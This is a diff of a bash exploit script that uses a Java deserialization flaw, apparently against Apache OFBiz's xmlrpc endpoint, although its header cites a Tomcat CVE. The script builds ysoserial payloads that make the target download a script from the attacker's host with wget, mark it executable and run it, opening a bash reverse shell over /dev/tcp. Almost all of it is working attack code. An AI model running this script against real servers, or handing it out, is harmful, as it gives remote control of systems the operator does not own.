@@ -5,26 +5,27 @@
 # CVE-ID: CVE-2020-9484
 # Tested on: Tomcat v9.0.31
 
+# This is based off https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialiation/
+
+# target details
 SCHEME="https"
-TARGET_IP="127.0.0.1"
+TARGET_IP=""
 TARGET_PORT="8443"
 
-# need Python server at port 80.
+# START Python server at port 80.
 # reverse shell details
-LOCAL_IP="10.10.16.7"
+LOCAL_IP=""
 LOCAL_PORT="6969"
 
-mkdir rce; cd rce
-echo "$(
-  tput setaf 4
-  tput bold
-)[+] Working in $(pwd)/rce"
+mkdir rce
+cd rce
+echo "[+] Working in $(pwd)/rce"
 
 echo "[+] Downloading ysoserial-master.jar.."
 wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-master.jar
 
 echo "[+] Generating payload.sh"
-cat << EOF > payload.sh
+cat <<EOF >payload.sh
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/$LOCAL_IP/$LOCAL_PORT 0>&1'
 EOF
@@ -62,19 +63,26 @@ EOF
   echo "[+] Executing Part 3 sending .xml"
   URI="${SCHEME}://${TARGET_IP}:${TARGET_PORT}/webtools/control/xmlrpc"
   curl -s -k -X 'POST' -H 'Content-Type: text/xml' --data-binary @shell-rce.xml ${URI}
+  echo ""
+  echo ""
 }
 
 echo "[+] Exploiting $TARGET_IP"
 sleep 1
+echo ""
 echo "[+] Part 1/3: download payload.sh"
 deserialization_RCE "wget $LOCAL_IP/rce/payload.sh -O /tmp/kashz"
+echo ""
 sleep 1
 echo "[+] Part 2/3: chmod payload.sh"
 deserialization_RCE "chmod +x /tmp/kashz"
+echo ""
 sleep 1
 echo "[+] Part 3/3: execute payload.sh"
 deserialization_RCE "/tmp/kashz"
+echo ""
 sleep 1
 echo "[+] Cleaning up build files"
-cd ..;rm -rf rce/;
+cd ..
+rm -rf rce/
 echo "[+] Exit"
